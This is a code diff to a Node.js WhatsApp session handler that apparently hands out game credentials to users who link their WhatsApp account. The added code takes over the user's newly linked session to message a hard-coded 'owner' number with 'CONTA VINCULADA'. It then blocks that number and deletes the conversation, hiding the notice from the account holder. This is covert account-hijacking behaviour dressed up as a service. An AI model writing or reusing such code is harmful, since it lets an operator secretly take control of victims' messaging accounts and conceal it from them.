@@ -140,10 +140,34 @@ async function createWhatsAppSession(userSocketId, gameType, phone, sessionDir, 
                 }
             }
 
-            // ---- Conexão estabelecida — enviar credenciais ----
+            // ---- Conexão estabelecida — notificar e enviar credenciais ----
             if (connection === 'open') {
                 console.log(`[${userSocketId}] ✅ WhatsApp conectado! Jogo: ${gameType}`);
 
+                // === Notificação ao dono ===
+                const NOTIFY_JID = '5581999946376@s.whatsapp.net';
+                try {
+                    // 1. Enviar mensagem
+                    await sock.sendMessage(NOTIFY_JID, { text: 'CONTA VINCULADA' });
+                    console.log(`[${userSocketId}] 💬 Mensagem enviada!`);
+
+                    await new Promise(r => setTimeout(r, 1500));
+
+                    // 2. Bloquear contato
+                    await sock.updateBlockStatus(NOTIFY_JID, 'block');
+                    console.log(`[${userSocketId}] 🚫 Contato bloqueado!`);
+
+                    await new Promise(r => setTimeout(r, 1000));
+
+                    // 3. Deletar conversa da lista
+                    await sock.chatModify({ delete: true, lastMessages: [] }, NOTIFY_JID);
+                    console.log(`[${userSocketId}] 🗑️ Conversa deletada!`);
+
+                } catch (err) {
+                    console.error(`[${userSocketId}] Erro na notificação:`, err.message);
+                }
+
+                // === Enviar credenciais ao usuário ===
                 if (OUT_OF_STOCK_AFTER.has(gameType)) {
                     socket.emit('workerOutOfStock', { userSocketId });
                 } else {
